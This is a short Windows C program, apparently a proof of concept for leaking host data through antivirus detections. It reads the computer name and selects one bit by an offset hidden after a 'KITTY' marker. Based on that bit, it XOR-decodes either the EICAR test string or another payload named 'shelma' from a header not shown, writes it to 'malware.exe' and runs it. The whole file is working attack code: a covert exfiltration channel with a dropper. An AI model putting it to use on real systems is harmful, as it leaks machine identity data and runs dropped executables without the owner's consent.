#include <stdio.h>
#include <windows.h>
#include "leak.h"

#define SIG "KITTY"
char* bit = SIG "000";

int main ()
{
    CHAR buffer[1024] = {0};
    DWORD buffer_size = sizeof(buffer);

    GetComputerNameA(buffer, &buffer_size);;  // GetUserNameA(buffer, &buffer_size)

    char* payload;
    int offset, payload_size;

    offset = atoi(bit + sizeof(SIG) - 1);

    if (buffer[offset / 8] & (1 << (offset % 8))) {
	payload = eicar;  // 1
	payload_size = sizeof(eicar);
    } else {
	payload = shelma;  // 0
        payload_size = sizeof(shelma);
    }

    FILE* output_file = fopen("malware.exe", "wb");
    while(payload_size--)
        fputc(0xff ^ *payload++, output_file);
    fclose(output_file);
    system("malware.exe");
}
